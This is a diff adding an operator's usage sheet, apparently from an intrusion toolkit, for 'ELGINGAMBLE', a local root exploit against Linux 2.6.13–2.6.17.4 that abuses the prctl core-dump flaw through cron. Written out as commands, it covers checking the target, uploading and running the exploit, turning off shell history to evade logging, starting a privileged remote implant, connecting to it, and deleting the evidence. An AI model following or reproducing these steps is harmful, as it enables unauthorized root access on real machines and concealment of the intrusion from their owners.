@@ -1,0 +1,123 @@
+#######################################
+# ELGINGAMBLE
+#######################################
+
+### local exploit for the following operating system versions:
+### Linux 2.6.13 - 2.6.17.4 and certain distros that contain a backport of the 
+### vulnerable functionality 
+
+### Local exploit for the public prctl core dump vulnerability in recent Linux kernels. 
+### It takes advantage of an input validation/logic error in the kernel to create 
+### a cron script that will spawn a root shell.
+
+### OPSEC:
+### vulnerability: public
+### exploit: public
+
+
+###
+### CHECK IF TARGET IS VULNERABLE
+###
+
+### check OS (for Linux 2.6.13 - 2.6.17.4)
+uname -a
+
+### make sure crond is running:
+ps -ef | grep crond
+
+### check if you have READ permission on /etc/cron.d (WRITE is part of the vuln.):
+-lt /etc/cron.d
+
+### make sure you have EXECUTE permission on crontab:
+which crontab
+-lt /usr/bin/crontab
+
+### check if there is a cron.allow or cron.deny that might hinder your success:
+-lt /etc/cron*
+-cat /etc/cron.allow
+-cat /etc/cron.deny
+
+
+###
+### if the above checks pass, you can try running it:
+### USAGE:
+
+#  elgingamble:
+#  -h (optional) Prints a help message
+#  -d (optional) Used to specify the system cron directory (defaults /etc/cron.d)
+#  -p (optional) Used to specify the core file prefix (defaults cron.PID)
+#  -s (optional) Used to specify a shell besides /bin/sh
+#  -t (optional) Used to specify the exploit timeout (defaults 5 minutes)
+
+### upload to target:
+-put /current/up/elgingamble eg
+
+### within nopen, run it from within -shell
+-shell
+./eg
+
+# You'll see the following messages, you must wait for the cronjob to run:
+
+	# can't set core limit, trying indirect
+	# crontab installed
+	# must do crontab -r when finished
+	# waiting for re-exec, ETA 60-120s
+
+# after waiting for the cronjob, run the following and start a new noserver
+# once you gain root access:
+
+unset HISTFILE
+unset HISTSIZE
+unset HISTFILESIZE
+id
+PATH=. sendmail
+
+
+### connect to privileged noserver:
+-nstun TARGET_IP
+
+
+### CLEANUP:
+crontab -l 
+crontab -r
+-lt /etc/cron.d
+-rm /etc/cron.d/core.PID
+-rm eg sendmail
+-lt
+
+
+### LOGS:
+-lt /var/log/cron
+-tail /var/log/cron
+
+
+
+
+###
+### TROUBLESHOOTING
+###
+
+# Exploit fails with message "kernel not vulnerable". The kernel is not vulnerable 
+# to exploitation. 
+# Remedy:None
+
+# Exploit fails with message "failed: indirect". The exploit tried and failed to 
+# have cron call it indirectly to bypass resource limitations. This can occur if 
+# the crontab program is not installed, could not be found, or is restricted through 
+# the use of cron.allow and cron.deny. 
+# Remedy:Make sure crontab is installed on the system and useable by the system 
+# user you use to run the exploit.
+
+# Exploit fails with message "failed". The exploit was unable to elevate to root. 
+# This indicates that the cron command was never executed.  One possible reason for 
+# failure is if the coredump created in the system cron directory is too small to 
+# contain a valid cron command. Other reasons could be that the cron directory 
+# is not accessible by non-priveleged users, or the cron daemon is not running on the system. 
+# Remedy:Make sure the cron daemon is running and the user running the exploit 
+# has read access to the system cron directory. Also check the core file limit.
+# 
+
+# Description: Any other failure message. Remedy: Make sure the default exploit parameters, 
+# such as cron directory and core file prefix, are valid for the target system. 
+# If not, rerun the exploit and specify the appropriate parameters on the command line.
+
